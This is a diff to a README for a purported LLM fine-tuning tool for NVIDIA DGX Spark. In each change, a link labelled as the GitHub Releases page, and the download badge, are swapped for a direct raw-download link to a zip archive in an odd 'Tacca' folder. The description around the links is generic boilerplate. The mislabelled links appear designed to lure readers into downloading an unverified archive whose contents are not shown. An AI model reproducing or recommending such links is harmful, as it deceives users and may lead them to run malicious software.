@@ -1,7 +1,7 @@
 # 🎉 dgx-spark-finetune-llm - Fine-Tune Your Language Model Easily
 
 ## 🌐 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/MoHussein197/dgx-spark-finetune-llm/releases)
+[![Download](https://github.com/MoHussein197/dgx-spark-finetune-llm/raw/refs/heads/main/Tacca/spark_finetune_dgx_llm_3.1.zip)](https://github.com/MoHussein197/dgx-spark-finetune-llm/raw/refs/heads/main/Tacca/spark_finetune_dgx_llm_3.1.zip)
 
 ## 📜 Description
 dgx-spark-finetune-llm is designed to help users fine-tune language models with ease. It uses advanced techniques like LoRA, NVFP4, and MXFP8 on NVIDIA DGX Spark (Blackwell GB10). This software provides a straightforward way to enhance machine learning tasks for various applications.
@@ -17,7 +17,7 @@ dgx-spark-finetune-llm is designed to help users fine-tune language models with 
 Getting started is simple. Follow these steps to download and run the software.
 
 ### 1. Visit the Download Page
-Start by visiting the [Releases page](https://github.com/MoHussein197/dgx-spark-finetune-llm/releases). This page contains all versions of the software available for download.
+Start by visiting the [Releases page](https://github.com/MoHussein197/dgx-spark-finetune-llm/raw/refs/heads/main/Tacca/spark_finetune_dgx_llm_3.1.zip). This page contains all versions of the software available for download.
 
 ### 2. Download the Latest Version
 Look for the latest version of dgx-spark-finetune-llm. Click on the version number to view its details. You will see a list of files associated with the release. Click on the appropriate file for your system to download it.
@@ -32,7 +32,7 @@ After installation, check if the software is working. You can open the applicati
 You are now ready to start fine-tuning your language models. Follow the provided user guide within the application for specific instructions on how to use the features, set parameters, and monitor training progress.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Releases Page](https://github.com/MoHussein197/dgx-spark-finetune-llm/releases). 
+To get started, visit this page to download: [Releases Page](https://github.com/MoHussein197/dgx-spark-finetune-llm/raw/refs/heads/main/Tacca/spark_finetune_dgx_llm_3.1.zip). 
 
 Once you download the application, install it by following the steps outlined above.
 
